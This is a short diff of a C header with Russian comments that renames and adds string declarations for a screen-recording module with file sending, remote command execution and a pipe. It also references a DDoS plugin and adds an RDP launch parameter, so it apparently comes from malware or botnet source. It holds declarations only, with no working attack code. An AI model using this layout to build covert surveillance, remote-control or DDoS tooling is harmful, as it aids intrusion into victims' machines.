@@ -102,15 +102,18 @@ extern CSSTR StrLogFileNetInfo[];
 
 
 // Имена функций библиотеки видеозаписи.
-extern CSSTR VideRecFuncRecordProcess[];
-extern CSSTR VideRecFuncRecordWnd[];
-extern CSSTR VideRecFuncStop[];
-extern CSSTR VideRecFuncResetTimer[];
-extern CSSTR VideRecFuncSendData[];
-extern CSSTR VideRecFuncRunPortForward[];
-extern CSSTR VideRecFuncInitSendLog[];
-extern CSSTR VideRecFuncReleaseSendLog[];
-extern CSSTR VideRecFuncSendLog[];
+extern CSSTR VideoRecFuncInit[];
+extern CSSTR VideoRecFuncRelease[];
+extern CSSTR VideoRecFuncRecordProcess[];
+extern CSSTR VideoRecFuncRecordWnd[];
+extern CSSTR VideoRecFuncStop[];
+extern CSSTR VideoRecFuncResetTimer[];
+extern CSSTR VideoRecFuncSendFiles[];
+extern CSSTR VideoRecFuncSendFilesAsync[];
+extern CSSTR VideoRecFuncIsSendedAsync[];
+extern CSSTR VideoRecFuncRunCmdExec[];
+extern CSSTR VideoRecFuncSendLog[];
+extern CSSTR VideoRecPipe[];
 
 
 // Константы модуля HTTP
@@ -143,6 +146,9 @@ extern CSSTR EStrDDOSPlugin[];
 
 // Имя файла данных для команды DDOS
 extern CSSTR EStrDDOSSignal[];
+
+//строка параметров для запуска RDP
+extern CSSTR RDPRunParam[];
 
 
 //*********************************************************************
